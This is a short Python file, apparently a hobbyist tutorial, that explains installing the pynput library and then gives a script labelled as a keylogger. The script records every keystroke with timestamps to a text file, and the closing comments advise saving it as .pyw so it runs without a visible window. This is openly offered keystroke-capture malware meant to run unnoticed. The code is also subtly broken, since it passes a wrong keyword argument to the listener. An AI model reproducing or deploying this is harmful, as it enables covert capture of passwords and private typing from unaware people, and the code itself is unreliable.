''' 
step1: Go through this url https://github.com/moses-palmer/pynput
Download the file
step2: Extract it to Python installed folder
step3: install the setup.py in respective folder
	open command prompt in that folder use the follwing command
	python setup.py install

To Verify whether pynput package installed or not use the follwing command and exceute it!	
import pynput
'''
# Use the following code to create a Keylogger


from pynput.keyboard import Key,Listener
import logging
#Defining your keylogger storage,format 
logging.basicConfig(filename='logger.txt',level=logging.DEBUG,format = '%(asctime)s : %(message)s')
#Defining your keylogger working
def key_press(key):
	logging.info(str(key))
with Listener(key_press=key_press) as Listener:
	Listener.join()


''' Save the file with 'pyw' extension not 'py' 
and execute it Keylogger starts working
To stop Keylogger open Task Manager and choose python and click End Process

The code is taken from the url given in the 1st line
Happy Coding!'''
